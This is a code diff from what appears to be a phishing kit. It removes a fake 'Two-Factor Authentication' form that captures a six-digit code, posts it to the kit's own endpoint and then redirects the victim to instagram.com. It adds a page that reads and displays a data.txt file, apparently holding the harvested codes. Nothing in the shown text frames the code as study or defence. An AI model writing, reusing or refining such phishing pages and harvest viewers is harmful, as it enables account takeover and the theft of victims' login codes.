@@ -1,56 +1,36 @@
-import { useState, useEffect } from 'react';
+import fs from 'fs';
+import path from 'path';
 
-export default function ViewOtpForm() {
-  const [otp, setOtp] = useState('');
+export async function getServerSideProps() {
+  const filePath = path.join(process.cwd(), 'data', 'data.txt');
+  let content = '';
 
-  useEffect(() => {
-    // Preload the notification sound
-    const audio = new Audio('/notify.mp3');
-    audio.load();
-  }, []);
+  try {
+    content = fs.readFileSync(filePath, 'utf8');
+  } catch (err) {
+    content = 'No data yet.';
+  }
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-
-    const res = await fetch('/api/otp', {
-      method: 'POST',
-      body: new URLSearchParams({ otp }),
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-    });
-
-    if (res.ok) {
-      const audio = new Audio('/notify.mp3');
-      audio.play(); // 🔊 Play sound on success
-      window.location.href = 'https://www.instagram.com';
-    } else {
-      alert('❌ OTP submission failed');
-    }
+  return {
+    props: {
+      content,
+    },
   };
+}
 
+export default function ViewPage({ content }) {
   return (
-    <div className="min-h-screen flex items-center justify-center bg-black text-white">
-      <form onSubmit={handleSubmit} className="space-y-4 bg-gray-900 p-6 rounded shadow-lg w-full max-w-md">
-        <h1 className="text-xl font-bold text-center">Two-Factor Authentication</h1>
-        <p className="text-sm text-gray-400 text-center">Enter the 6-digit code sent to your phone</p>
-        <input
-          type="text"
-          name="otp"
-          value={otp}
-          onChange={(e) => setOtp(e.target.value)}
-          placeholder="Enter OTP"
-          maxLength={6}
-          className="w-full px-4 py-2 rounded bg-gray-800 border border-gray-700 text-white tracking-widest text-center"
-          required
-        />
-        <button
-          type="submit"
-          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded"
-        >
-          Continue
-        </button>
-      </form>
+    <div style={{
+      backgroundColor: "#000",
+      color: "#fff",
+      padding: "20px",
+      fontFamily: "monospace",
+      whiteSpace: "pre-wrap",
+      minHeight: "100vh", // ✅ Fix added here for full-screen background
+      boxSizing: "border-box"
+    }}>
+      <h2>📄 data.txt contents</h2>
+      <pre>{content}</pre>
     </div>
   );
 }
